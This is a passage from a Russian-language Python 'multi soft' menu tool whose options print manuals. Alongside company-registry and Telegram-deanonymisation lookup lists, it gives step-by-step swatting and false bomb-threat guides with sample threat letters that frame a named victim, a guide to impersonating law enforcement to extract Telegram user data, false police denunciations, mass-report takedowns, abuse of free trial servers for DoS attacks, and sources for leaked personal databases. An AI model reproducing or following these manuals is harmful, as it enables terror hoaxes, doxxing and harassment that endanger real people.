8. dlugi.info (https://www.dlugi.info/advsearch) — по названию организации или ИНН/NIP найдёт долги
9. crbr.podatki.gov.pl (https://crbr.podatki.gov.pl/adcrbr/#/wyszukaj) — по ИНН или NIP найдет адрес регистрации компании, полное имя, KPS, организационная форма, почтовый индекс
-------------------------------------------
Для документов юридических лиц Сингапура
-------------------------------------------
1. www.bizfile.gov.sg (https://www.bizfile.gov.sg/ngbbizfileinternet/faces/oracle/webcenter/portalapp/pages/BizfileHomepage.jspx) — по названию компании или UEN найдет адрес и статус организации
-------------------------------------------
Для документов юридических лиц Вьетнама
-------------------------------------------
1. muasamcong.mpi.gov.vn (http://muasamcong.mpi.gov.vn/csdl/nha-thau) — поиск по названию компании, регистрационному номеру предприятия, найдет информацию о подрядчике
2. dichvuthongtin.dkkd.gov.vn (https://dichvuthongtin.dkkd.gov.vn/inf/default.aspx) — поиск по названию компании, регистрационному номеру предприятия, найдет адрес и имя представителя
3. dichvuhotrodoanhnghiep.hanoi.gov.vn (http://dichvuhotrodoanhnghiep.hanoi.gov.vn/Banking/list/54-59/54-59/isb-tra-cuu-ten-doanh-nghiep.aspx) — поиск по названию компании, регистрационному номеру предприятия, найдет адрес и имя представителя
-------------------------------------------
Для документов юридических лиц Таджикистана
-------------------------------------------
1. andoz.tj (https://andoz.tj/Fehrist/Ur?culture=ru-RU) — поиск по названию фирмы, найдет сведения о зарегистрированных юридических лицах
-------------------------------------------
Для документов юридических лиц Японии
-------------------------------------------
1. courts.go.jp (http://www.courts.go.jp/app/hanrei_jp/search2) — по названию компании в базе судебных дел
2. itp.ne.jp — по названию компании найдет телефон и адрес
-------------------------------------------
Для документов юридических лиц Узбекистана
-------------------------------------------
1. stat.uz (https://stat.uz/ru/uslugi-1/svedeniya-iz-egrpo) — поиск по ИНН, найдет сведения о юридическом лице
2. orginfo.uz — по названию компании или STIR, найдет базовую информацию об организации
-------------------------------------------
Для документов юридических лиц Монголии
-------------------------------------------
1. opendata.burtgel.gov.mn (http://opendata.burtgel.gov.mn/les?condition=3) — по названию компании найдёт регистрационный номер и общую информацию

Поиск через URL

1. http://opendata.burtgel.gov.mn/lesinfo/123456 — найдёт имя компании, дату регистрации, акционеров и членов организации, руководителя, сферу деятельности. Замените 12345 на регистрационный номер компании
-------------------------------------------
Для документов юридических лиц Казахстана
-------------------------------------------
1. pk.uchet.kz — поиск по названию фирмы, БИН и ФИО руководителя компании, найдет дату регистрации, ИИН/РНН и ФИО руководителей, статус благонадежности
2. kompra.kz — поиск по названию фирмы, БИН и ФИО руководителя, поиск по ИП. Найдет руководителя. Для полного отчета нужно пройти регистрацию с получением СМС кода
3. kgd.gov.kz (http://kgd.gov.kz/ru/services/taxpayer_search/legal_entity) — поиск по названию фирмы, РНН/БИН организации, иногда не работает
4. fa-fa.kz (https://fa-fa.kz/search_ip_too/) — поиск по названию фирмы, БИН, проверит активность фирмы, налоговые отчисления за последние несколько лет, проверка в реестре должников по исполнительным производствам, юр.адрес, ФИО директора
5. adata.kz (https://adata.kz/fines) — по ИИН/БИН проверка на штрафы
6. adata.kz (https://adata.kz/contract) — по ИИН/БИН названию компании, находит государственные договора
7. aisoip.adilet.gov.kz (https://aisoip.adilet.gov.kz/forCitizens/findArest) — по ИНН или БИН проверит аресты счета, имущества, запреты на выезд и регистрацию
8. imei.rfs.gov.kz (https://imei.rfs.gov.kz/index_ru.php) — по ИНН найдет название оператора и число зарегистрированных телефонных номеров
9. idp.egov.kz (https://idp.egov.kz/idp/register.jsp) — по ИНН, форма регистрации, найдет часть номера телефона
-------------------------------------------
Поиск по названию китайских компании
-------------------------------------------
1. gsxt.gov.cn (http://www.gsxt.gov.cn/index.htm) — подробная информация об организации
2. qichacha.com (https://www.qichacha.com/) — подробная информация об компании
3. zxgk.court.gov.cn (http://zxgk.court.gov.cn/zhzxgk) — судебные дела, в которых упоминается определенное имя, фамилия или название компании
4. qcc.com — дата основания, представитель, капитал, единый код социального кредита, адрес компании, сфера отрасли, и ее сфера деятельности, судопроизводства, информация для акционеров, персонал, иностранные инвестиции, журнал изменений
5. pccz.court.gov.cn (https://pccz.court.gov.cn/pcajxxw/index/xxwsy) — найдет в должниках профиль компании, адрес, реквизиты
6. cninfo.com.cn (http://www.cninfo.com.cn/new/index) — найдет профиль компании, руководителей, отчеты брифингов, финансовые показатели, акционеры, холдинги и много другого
-------------------------------------------
Поиск по регистрационному номеру Китая
-------------------------------------------
1. gsxt.gov.cn (http://www.gsxt.gov.cn/index.htm) — подробная информация об организации
2. zxgk.court.gov.cn (http://zxgk.court.gov.cn/zhzxgk) — судебные дела, в которых упоминается определенное имя, фамилия или название компании
-------------------------------------------
Поиск по коду социального кредита Китая
-------------------------------------------
1. gsxt.gov.cn (http://www.gsxt.gov.cn/index.htm) — подробная информация об организации
-------------------------------------------
Для документов юридических лиц Израиля
-------------------------------------------
1. ica.justice.gov.il (https://ica.justice.gov.il/AnonymousRequest/Search) — поиск по названию компании, найдет адрес и имя владельца
-------------------------------------------
Для документов юридических лиц Кипра
-------------------------------------------
1. efiling.drcor.mcit.gov.cy (https://efiling.drcor.mcit.gov.cy/DrcorPublic/SearchForm.aspx) — поиск по названию компании и регистрационному коду, он покажет вам статус, адрес, директоров и секретарей, документы и многое другое
2. i-cyprus.com — по названию компании найдет адрес, директоров и секретарей, дату регистрации и регистрационный номер
-------------------------------------------
Для документов юридических лиц Айзербаджана
-------------------------------------------
1. e-taxes.gov.az (https://www.e-taxes.gov.az/ebyn/commersialChecker.jsp) — поиск по названию компании, найдет VÖEN, юр. адрес, капитал, представителей и дату регистрации. После того как вы введете название компании вы получите VÖEN код, а его вставьте обратно в поиск и переключите на поиск по VÖEN
-------------------------------------------
Для документов юридических лиц Новой Зеландии
-------------------------------------------
1. govt.nz (https://app.companiesoffice.govt.nz/companies/app/ui/pages/companies/search) — поиск на названию компании, адресу. Найдет адрес компании, директоров, акции, документы
-------------------------------------------
Для документов юридических лиц Австралии
-------------------------------------------
1. abr.business.gov.au (https://abr.business.gov.au/Search/) — поиск по ABN, ACN и названию организации, найдет статус компании, дату регистрации, адрес
2. connectonline.asic.gov.au (https://connectonline.asic.gov.au/RegistrySearch/faces/landing/SearchRegisters.jspx) — поиск по названию компании, номеру документа. Найдет дату регистрации, статус, адрес, ACN/ABN

-------------------------------------------
Создатель - Kanaizu
Проэкт - shrm
-------------------------------------------

Базы данных

Список ресурсов где можно скачать открытые утечки и базы 

1. databases.today (https://web.archive.org/web/20190409132908/https://cdn.databases.today) — архив баз банков, сайтов, приложений
2. ebaza.pro (r) — есть email, телефонные номера, физ. лица, предприятия, базы доменов и другие
3. xss.is (http://xssforumv3isucukbxhdhwz67hoa5e2voakcfkuieq4ch257vsburuid.onion/?secure_0329976453/main) — список баз, 3,5B записей, 52 базы, ссылка на сайт в сети Tor
4. hub.opengovdata.ru — Российские базы статистики, росстата, архивы сайтов, финансы, индикаторы, федеральные органы власти, суды и т.д
5. @freedomf0x — утечки сайтов, приложений, гос. структур
6. @BreachedData — утечки сайтов, приложений, соц. сетей, форумов и т.д.
7. @fuckeddb — дампы сайтов, приложений, социальных сетей, школ, судов, институтов, государственных ресурсов, форумов по всему миру
8. @DWI_OFFICIAL — утечки сайтов, приложений, базы паспортов и прочее
9. @FriendlyLemon — утечка Facebook для всех стран
10. @leaks_databases — агрегатор публичных утечек
-------------------------------------------------------------------------------------
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '59':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Мануал об: 

- Как скачать Tor Browser ? 
- Как настроить Tor Browser чтобы он был анонимным ?

Сперва, что такое Tor Browser и почему он как утверждают многие "самый анонимным браузер"

Tor Browser - браузер, который предоставляет анонимность, пользователю который его использует так как анонимизация трафика обеспечивается за счёт использования распределённой сети серверов — узлов. 
Более простыми словами: Tor - это свободное програмное обеспечение с много-уровневой маршрутизацией, что позволяет устанавливать анонимную сетевую связь с чем либо.

Интересный факт: Tor начали делать в 90-х годах. 

Чтобы скачать Tor надо зайти на официальный сайт Tor ( https://www.torproject.org/ ), выбираем вашу ОС и скачиваем

Вот Вы скачали Tor. Чтобы сделать его анонимным вам надо:

- Зайти на 3 палочки ( в правом верхнем углу ).
- Настройки.
- Приватность и защита.
- Листаем вниз и ищем "Параметры", и ставим галочки.
Так делаем в каждом пункте ( Местоположение, Камера, Микрофон, Уведомление ).
- Ставим галочку на "Запретить службам поддержки доступности доступ к вашем браузеру" и перезапускаем Tor Browser.

- После перезапуска идем снова на 3 палочки ( в правом верхнем углу ).
- Заходим в раздел "Дополнения"
- Заходим в "Расширения", видим расширение "NoScript", нажимаем на 3 точки, и далее "Настройки"
- Если у вас будут стоять галочки в отделе "Разрешить" на: script, object, media, frame, font, webgl, fetch, ping, noscript, other - убираем ВСЁ галочки, ведь если этого не сделать шанс на заражение вашего ПК вирусом возрастет в разы.
- После этого создаем новую вкладку и пишем "about:config", в появившемся окошке поиска пишем: "javascript:enabled" и нажимаем на true ( если он там стоит ) делая вместо true - false
Так делаем еще с: network.http.sendRefererHeader ( только вместо true/false,в поле где стоит цифра 2 - пишем 0 )

Чтобы у вас ТОЧНО была анонимным - лучше использовать VPN ( MullvadVPN, ProtonVPN, NordVPN лучшие ), ну или же бесплатные ( 1.1.1.1, PlanetVPN, Crack ProtonVPN ( Crack ProtonVPN достаточно легко найти, и даже без вирусов ) )

Спасибо за прочтение данного мануала) 
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '60':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Рад приветствовать снова!
Итак, Вам понадобятся:
1. Сим-карты / Виртуальные номера
2. PuTTY
3. Умение чистить кэш и куки.
Первое, что мы должны сделать, это зайти на сайт https://www.ihor.ru/ , далее выбираем VDS Хостинг --> KVM SSD Cuprum --> 3 дня бесплатно. Настраиваем конфигурацию, а именно ставим операционку Debian 8 x64. Выполняем дальнейшие требования, а именно подтверждаем почту и номер телефона. Через 10 минут после этих действий Вам выдадут сам дедик в формате:
IP: 255.255.255.255
Login: root
Password: xx123xx321xx
Заходим в PuTTY, вводим IP, Коннектимся, логин root, пароль вставляется с помощью ПКМ (НЕ Ctrl + Z!!!).
Все, через FileZilla загружаем наши / другие скрипты в корень и можем проводить DoS-атаки.
После истечения срока действия, чистим кэш и куки, регистрируемся заново с новыми данными, а именно: Имя, телефон, мейл.
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '61':
             print(Colorate.Vertical(Colors.cyan_to_green, """
=======================================================================
BY QWENTY
Так для начала нам надо регнуть почту mail.ru, proton.mail. через сайт,на имя жертвы, думаю тут ничего объяснять не надо. после как создали там заходим в телеграм и покупаем вирт номер для protonMail или Mail.ru. 
Вот эти самые лучшие боты(не реклама) 
там не сливают ввши логи смс!
@GreedySMSbot, @SMSBest_bot. После когда купили вам нужен будет хороший платный
впн,прокси нужен тоже! советую юзать 
муллвад впн, он самый имбовый. если
хотите ключ для него вы можете его
у меня купить! подробности в лс.
после когда вы купили вирт для почты
после вам нужно написать текст который не попадет в спам. лучшие будет рассписать так
Swatting manual Итак, для успешного подрыва нам понадобятся следующие инструменты: 1) Операционная система Android 2) Proton Mail 3) Мега ебейшая связка мультихоп Proton VPN >> MullVad VPN 4)Tor Browser ( со всеми плагинами ) или Fire Fox с плагинами Что такое мультихоп? это еонда ты включаешь 2 и более впн на телефоне одновременно 1)Первым делом создай новую потчу на Proton Mail. 2)На телефоне скачай виртуалку. 3) В виртуалке скачай ещё одну виртуалку. 4) Скачай на сам телефон без виртуалки MullVad. 5) На первой вирте скачай такую-же но ставьте другой регион. 6) На 2 виртуалке скачай Proton VPN. 7) Скачайте на последнию Виртуалку тор браузер. или Fire Fox с Плагинами) 8) Заходите на сайт Proton Mail (для более безопасного способа) 9)Виртуальная машину >> Настраиваем браузер FireFox ----> настройки ----> улутшыть защиту от отслеживания ----> персональные ----> удаление(на автоудаление куки обязательно (можете выбрать все куки или сами настроить)) и можете включить для лутшей защиты (Режим только Https) на все впн включаем (kill switch ). функциия в настройках впн браузер, ставим проксач, все нужные дополнения (на автоудаление куки обязательно). Покупаем Электронную почту Протон Маил надо отправлять в каждую щель любой структуры, будь то фсб письмо с анти фродом Что такое антифрод? Это когда в письме делается цензура, к примеру на слово кровь, (К0BЬ) такого рода пример. Далее, делаем длинное письмо, которое будет похоже на письмо какого=то психа. (ОБЕЗАТЕЛЬНО)НАДО ОТПРАВИТЬ ЭТО ПИСЬМО НЕ МНЕНИЕ ЧЕМ НА 20 ПОЧТ ЧТОБЫ ИМ ЗАИНТЕРЕСОВАЛИСЬ. После отправляем Так же в письме оставляем контактные данные нашей жертвы Желательно ФИО и Номер или карту. (ОБЯЗАТЕЛЬНО) Следите за временем местоположение жертвы, и не отпровляйте тупые письма в час ночи, когда тц и суды не работают, следите четко за временем и все получится. (Можно заминировать любое здание от имени любого человека.) (если нету не номера не фио модно указать соц сеть но шанс падает) (отправляйте больше чем 50 мест стобы вами заинтересовались)
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '62':
             print(Colorate.Vertical(Colors.cyan_to_green, """

В данном мануале описывается способ сваттинга через звонок. Нам потребуется виртуальный номер, через который можно осуществлять звонки. Далее, нам нужна любая программа, изменяющая голос.

К слову, уточню, что можно использовать "скрытый" номер, для этого есть специальные апк-софты.

Начнем. Для начала, обеспечиваем себе анонимность, в виде впн. Качаем два впн - Норд и Муллвад. Запускаем сначала муллвад, используя регион Швеция, а следом - впн Норд, используя регион страны жертвы. Далее, меняем голос и звоним в полицию, говорим, допустим:

Здравствуйте, я хочу сдаться в преступлении. Я убил своего друга. Мое имя Василий Пупкин Васильевич, проживаю по адресу Москва, Троицкое Шоссе 2Б, квартира 35. 

Отвечаем на все вопросы оператора, называя данные нашей жертвы и к нему приезжает полиция. 

Отключаем впн Норд, отключаем впн муллвад и стираем данные с виртуального номера, удаляя его. Готово!

Отлично, минус один недоброжелатель в вашей жизни!

"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '63':
             print(Colorate.Vertical(Colors.cyan_to_green, """
1. Скачать Planet PVN + включить
2. Скачать ВМ + образец виндовс и включить ее 
3. Скачать на ВМ хром + 1.1.1.1 VPN + вацап ( если есть номер тц / шк или че надо в вацапе )
4. Запустить VPN ( 1.1.1.1 на ВМ )
5. Прокси ( по желанию )
6. На хроме сделать почту
7. Зарегать вирт. номер ( или физ ) на вацап ( если есть номер в вацапе )
8. Написать на номер в вацапе
9. Текст ( такой же и в пункте: 10 ): Zдравствуйте. Я ( ФИО Врага или же просто ничего вместо ФИО ) zаминироv@л ( тц или шк или че там надо ) . Esли vы не эвакуируете люdeй в течение 1-х суток - будут жертвы. ( Если есть враг то пиши: Или же присыл@йте мне на к@рtу ( номер телефона ) 10000$ и не будеt жерtв. ).
10. Пиши на почты fsb@fsb.ru ; csnsput@fsb.ru ( текст как в 9 пункте )

Всё, ты заминировал тц / шк от имени врага и он проебан.

Все стоит 0 рублей ( ну почти прокси если хотите и твинк в вацап если есть )

Уточню почты ФСБ. Поэтому такой анон. 

By xGuSt. И мне грустна. 
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '64':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Всем привет, что делать если вас сватнули?
Если каким-то образом ваши данные нашли и угрожают вам сватом
1.Не паникуйте, не факт что человек отправит письмо(может просто запугивать)
2.Если вы занимались доксом/сватом:
      •Сбросьте телефон до заводских настроек
      •На пк переустановите операционную систему
      •Удалите тг аккаунт/вк(или другие соц-сети где бы вы могли отправлять, что-то о доксе или свате)
    
 
   По приезду ментов, ваш пк/телефон/планшет - могут изъять на экспертизу
  
 Если у вас нет ничего связанного с narкотиками/bomбами/doксом/sватом
 То вам нечего боятся) 
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '65':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Мануал по сносу Telegram аккаунта
Что бы сносить аккаунт, нужно иметь нарушения, сейчас я подробно распишу, за что можно снести акк.
Нарушение правил Telegram: 
1. Угрозы, Буллинг
2. Продажа запрещенных услуг (сваттинг, деанон)
Алгоритм действий:
1. Пишем на почту поддержке Telegram:  DMCA@telegram.org , или же - abuse@telegram.org
2. В сообщении пишем по шаблону:
Здравствуйте, данный телеграмм аккаунт:
@nickname
Продает услуги деанонизации личности и сваттинг:
скриншоты прилагаются в письме
Фото с угрозами минирования зданий:)
(скриншоты) 
Угрозы и буллинг:
(скриншоты) 
Прошу Вас заблокировать данный аккаунт, за нарушение правил.
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '67':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Здравствуйте,в этом небольшом мануале я расскажу как писать доносы на кого то.
Доносы бывают разные,напрямую через сотрудника,например если у вас есть знакомый мент.Письменные-вы пишите письмо на почту мвд о деятельности человека,нарушаюшего закон РФ,к нему приезжают и осматривают его тг на наличие запрещенных файлов,каналов.Еще можно звонить на номер в мвд,но врятли в это поверят.
Для начала нам нужно какой нибудь отправщик писем."Gmail" либо ОСМТ бот(отправщик писем,обычно это анонимные отправщики для сватеров) Но доносы и на этом писать можно.Самый легкий вариант приложение "InstAddr" Там есть функции подмена почты,домена.
Ищем почту мвд в гугле,пишем "электронная почта мвд(город).Лучше сразу три,чтобы прочитали.Пишем текст "Здравствуй,я хочу анонимно пожаловаться на такого человека как "его ФИО",он занимается незаконным хранением личных данных других людей,без их ведома.А так же лжнмини*ованием.Его адрес(его место жительства)"
И так сразу на три разных адреса мвд его области или города,потом меняем айпи в впн.Бот телеграмм для вирт почты @TempMailBot

Данный мануал писал @hysteriamvd
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '68':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Сегодня поговорим на тему как же вытянуть логи с телеграмма, все просто!
Сразу предупреждаю что вам понадобится Mullvad vpn и Linux Qubes OS, т.к выдавать себя за фбр дело не из чистых.
Так если вы все включили анонимность для вытягивания логов с телеграмма надо отправить на эти почты письмо, все почты и письмо указано ниже.

Письмо — 
Здравствуйте. На данный момент, на вашей платформе появился кибер-преступник, чья личность нас заинтересовала из за массовых заявлений, а так же ложных заявлений о минировании с его никнейма.
Наша команда айти-специалистов просит вас выдать нам сервера данного пользователя вашей платформой: [ID]: [PHONE]:[USERNAME]
Если вы согласны, то просим предоставить информацию на нашу гражданскую почту [email], для завершения дела. Надеемся на сотрудничество.

Почты на которые надо отправить — 
stopCA@telegram.org, abuse@telegram.org, dmca@telegram.org

Письма стоит отправлять в 4-7 утра по мск, а так же стоит кинуть еще письмо на английском с тем же текстом.
На этом я с вами прощаюсь друзья, с помощью этого мануала вы научились вытягиванию логов с телеграмма.
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '69':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Manual by mefoskvit

Для написания утилиты, нам понадобится: немного знаний языка python, среда разработки, исходный код.
Начнём.

1) Python

- На ютубе полно всяких роликов по изучению pythonn, но если вы хотите все сделать самим то вам придётся постаратся!

Вообще, что такое python?

 - это интерпретируемый, объектно-ориентированный, высокоуровневый язык программирования общего назначения (Задушнил)

2) Среда разработки 

Среда разработки может быть абсолютно любой, для самых отважных есть блокнот.
Лично из моего опыта я бы посоветовал Visual Studio Code

Почему не pycharm?
 - Я считаю что пайчарм более для проффесинальных проектов, такие как сайты, игры и всё такое
   VS Code Прост в написании так как он напрямую может вам помочь с написанием.
   И те же самые дополнительные скрипты для него, которые могут вам менять темы, проверить орфографии, проверить работоспособность и вообще всё что угодно
   Даже если заглянуть, можно увидеть ChatGPT который в настоящем времени сможет вам написать код

3) Исходный код

- Начнем с того, что воровать чужие труды очень некрасиво, в кодер КМ вас не будут принимать за крутого кодера который сделал что-то не сам
  Ну если вы прям чайник в написании то вы можете взять под основу ту же самую Akuma, которая есть у меня в канале.
  Если вы хотите зарабатывать на написании софтов, то вам придётся делать всё самому, а если вас вскроют за воровство то это как минимум:
  1) Минус репутация в км
  2) В редком случае у вас просто перестанут покупать 

4) Сама разработка

- Для начала вам нужно понять, в каком направлении вы будете делать утилиту: OSINT, search database, hacking, pentesting и тд.
  Если вам не лень можно это все сделать в 1 софте, такой софт будет не просто Soft а Multi Soft
  
  Если вы хотите OSINT-разведку, то вам с вероятностью 100% должен быть API,
  
  API - это набор протоколов, определений и инструментов, которые позволяют различным программным приложениям взаимодействовать друг с другом. API выступает в качестве посредника, предоставляя стандартизированный способ для приложений обмена данными и функциональными возможностями. (Задушнил x2)
  Вы можете найти какую-нибудь документацию или что-то подобное.
  Вам лень делать самому? - Тогда зачем ты вообще это читаешь?

  search database
  
- По названию уже понятно что это такое.
  Вообще поиск по базам иногда не самый лучший способ, но тем не менее.
  Возьму пример с Timoria >
  
  - Лучший софт по поиску людей. Количество баз данных я не знаю но зато знаю что этот софт делает 1 из лучших разработчиков в КМ.
  
  У него базы данных находятся на сервере, это не просто базы, в некоторых источниках можно конечно найти, но они считаются приватом

  По словам самого Разработчика, он брал у продавцов баз, так-как такие базы почти нигде не найти.
  
- Для вас подойдет оптимальный вариант, API от ботов
  Так как я сомневаюсь что вы читаете этот мануал и вы можете сделать также как и Timoria
  
  API можно взять у разных ботов userbox, leakosint, egril, даже вроде есть api от самого глаза бога (не уверен)
  Да, услуга конечно не бесплатная во всех случиях, но зато лучший в использовании.
  Раньше даже сам делал софты на API

5) Заключение

Надеюсь я разобрал всё на части и вам было понятно, если нет, то попробуйте сами разобратся в этом, как в моём случае. С вами был Мефосквит, ещё увидимся)
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '70':
             print(Colorate.Vertical(Colors.cyan_to_green, """
by kapsov

                                                   Теория
Снести можно АБСОЛЮТНО любой тгк/тг ,чтобы это сделать,вам нужны конкретные нарушения правил телеграмма
Сами правила приведу ниже:
•Пропаганда насилия и призывы к терроризму
•Незаконное распространение музыкальных произведений(авторские права)
•Порнография(любая)
•Постоянное использование ботов в чате(спам)
•Постоянная навязчивая самореклама в чате(спам)
•Использование на канале исполняемых файлов (АРК или EXE) с вирусами
•Ну и напоследок, не приветствуется массовое использование стикеров и гифок.
•Любой аккаунт может быть заблокирован. Если использует принципы финансовых пирамид, так называемые схемы Левина Понци. То есть, клиентов заманивают высокими процентами или дивидендами, но полученные деньги не вкладываются, а с них выплачиваются проценты старым клиентам.
•Различные партнерские программы не приветствуются модераторами Телеграмм. То есть те аккаунты. В которых основная цель: получение процентов от каждого нового клиента компании, на которую стоит ссылка с аккаунта, могут попасть в вечный банн.
•Реферальные схемы, где есть посылы или обещания бесплатных денег или валюты.
•Ставки или схемы инвестиций любого рода(реклама финансов казиков и тд)
•Оскорбления и унижения группы людей. Группы людей могут быть разными, объединены по расовому признаку, религии, полу, возрасту, национальности и пр.
•Жестко модерируются аккаунты в которых выявлены факты притеснения
Канал блокируется, если в нем есть факты разглашения чужих личных данных. Это могут быть: ФИО, фото, адреса проживания и номера телефонов.(деаноны сваты)

                                                   Практика
Для начала давайте подготовимся
Вам нужно:
•50+- разных почт/Отправщик с возможностью смены почт
•Подготовить текст для жалобы
•Подготовить почты,куда вы будете это всё отправлять

!Почты можно купить оптом где-нибудь на маркетах в инете типа даркстора или лолза,отправщики можете найти спросив у кого-то в км

•Текст
Вот вам шаблончик,его можно использовать для всех типов правил,главное только его переформулировать под канал и нарушение

Здравствуйте,уважаемый модератор телеграмм,хочу пожаловаться вам на пользователя/канал,который (причина). 
Tg или ссылка на тгк: 
Id или ссылка на нарушение: 
Доказательства-скриншоты: 
(заливаете скриншот нарушения на любой сайт-хост картинок и кидаете сюда ссылку,фото должно быть без любой обработки)
Просьба заблокировать данный аккаунт/канал.

•Почты,куда надо отправлять
sms@telegram.org, dmca@telegram.org, abuse@telegram.org, sticker@telegram.org, stopCA@telegram.org, recover@telegram.org, support@telegram.org, security@telegram.org

!Примечание
Полной гарантии блокировки конечно нет. Но то что канал уже попадёт под наблюдение –это точно. 
И при последующих нарушениях с таким каналом точно не будут церемонится. 
В одиночку заблокировать канал Телеграмм достаточно трудно, но возможно.

!Жизнь упрощают софты для отправки и отправщики в телеге,а так же боты для сносов типо c1report.

by reyzov
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '71':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Поиск по фото

 Ресурсы
├ azure.microsoft.com (https://azure.microsoft.com/ru-ru/services/cognitive-services/face/#item2Content-centered) — соотнесение лиц, определит вероятность того, что на двух разных изображениях изображен один и тот же человек, и выдаст оценку достоверности
├ findclone.ru — поиск по базе из VK
├ pimeyes.com — индексирует фото с сайтов, не точен, ограниченные возможности
└ search4faces.com — поиск по базам лиц VK и OK. Не точен
 Поисковые системы
├ Yandex (https://yandex.ru/images/) - https://yandex.ru/images
├ Google (https://www.google.com/imghp) - https://www.google.com/imghp
└ Bing (https://www.bing.com/visualsearch) - https://www.bing.com/visualsearch
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '72':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Для поиска по ID и юзернейму аккаунта Telegram

1. Telegago (https://cse.google.com/cse?q=+&cx=006368593537057042503:efxu7xprihg) — поиск каналов и групп, включая приватные, а так же поиск в Telegraph статьях
2. lyzem.com — поисковик аналогичный buzzim
3. @usinfobot — по ID найдёт имя и ссылку аккаунта, работает в inline режиме, введите в поле ввода сообщения @usinfobot и Telegram ID
4. cipher387.github.io (https://cipher387.github.io/quickcacheandarchivesearch/) — покажет архивированную страницу, даст 20+ прямых ссылок на сайты веб архивы, поиск по ссылке на аккаунт
5. tgstat.com (https://tgstat.com/ru/search) — поиск по публичным сообщениям в каналах
6. @SangMataInfo_bot — история изменения имени аккаунта
7. @TeleSINT_Bot — найдет группы в которых состоит пользователь
8. @creationdatebot — примерная дата создания аккаунта, бот принимает username, но не работает поиск по ID. Для поиска по ID можно переслать сообщение от пользователя
9. @MySeekerBot — поисковик по иранским каналам
10. @get_kontakt_bot — найдет номер телефона аккаунта, бот принимает username и ID
11. TelegramOnlineSpy (https://github.com/Forichok/TelegramOnlineSpy) (t) — лог онлайн активности аккаунта
12. Exgram (https://yandex.ru/search/site/?text=%22HowToFind%22&searchid=2424333) — поисковая система на основе Яндекса, поиск по 17 сайтам-агрегаторам, находит Telegraph статьи, контакты, приватные и публичным каналы с группами
13. Commentgram (https://cse.google.com/cse?cx=006368593537057042503:ig4r3rz35qi) — поиск в комментариях к постам
14. Commentdex (https://yandex.ru/search/site/?text=%22HowToFind_bot%22&searchid=2444312) — поиск в комментариях к постам
15. ⚡️@UniversalSearchBot — по ID найдёт базовые адреса почты в сервисе etlgr, статус бана пользователя ботом combot, число блокировок, заблокированные сообщения и дату начала бана
16. smartsearchbot.com — бот находит ФИО, бесплатный поиск не доступен для новых пользователей
17. @kruglyashik — канал с базой из 500K круглых видео-сообщений из русскоязычных групп, в поиске по каналу введите имя пользователя или #ID123456789 где 123456789  ID аккаунта
18. @TgAnalyst_bot — находит номер телефона, старое имя аккаунта, логин, IP и устройство, местами могут быть ложные данные, первый поиск без регистрации, если её пройти, то сливается ваш номер телефона
19. глазбога.рф — найдет часть номера телефона, историю изменения ссылки аккаунта
20. @clerkinfobot — дает номер телефона 
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '73':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Ресурсы с личными номерами
├ Twilio.com - есть приложение для телефона, можно арендовать номер на долгий срок (год и более)
├ onlinesim.ru — возможно получить СМС и зарегистрировать аккаунт
├ Esendex.co.uk - можно получить пробный период пользования виртуального номера путем быстрой регистрации, в пакет входит 25 бесплатных сообщений, ограничение пользования в 7 дней
├ Burstsms.com.au - в пробный период входит 14 дней пользования
├ Directsms.com.au - 30-дневная пробная версия
└ Vumber.com - 14-дневная пробная версия

 Ресурсы с публичными номерами для приема смс
├ Smsc.ru - нужна регистрация. Есть русские и украинские номера
├ Onlinesim.ru - есть русские и украинские номера
├ Receive-sms-online.info
├ Receivefreesms.next
├ Sms-receive.net
├ Receive-a-sms.com
├ Hs3x.com
├ Receive-sms-now.com - есть русские номера
├ Smsreceivefree.com
├ Receivesmsonline.com
├ Getsms.org - есть русские номера
├ Tempsms.ru - есть русские номера
├ Numberforsms.com - есть русские номера
├ Sonetel.com
├ Smska.us - есть русские номера
├ Sellaite.com
├ Sms.ink - есть русские номера
├ Proovl.com
├ Zadarma.com - есть русские номера
├ Freevirtualnumber.skycallbd.com
├ Getfreesmsnumber.com
├ Receive-smsonline.net
├ Receivefreesms.com
├ Receivesmsverification.com
├ Sms-online.co
├ Ireceivesmsonline.com
├ Receive-sms-online.com - есть украинские номера
├ Receive-sms-free.com
├ Esendex.com.au - нужна регистрация
├ Receivesmsonline.in
├ Mytrashmobile.com
├ Receivesmsonline.me
├ Anon-sms.com
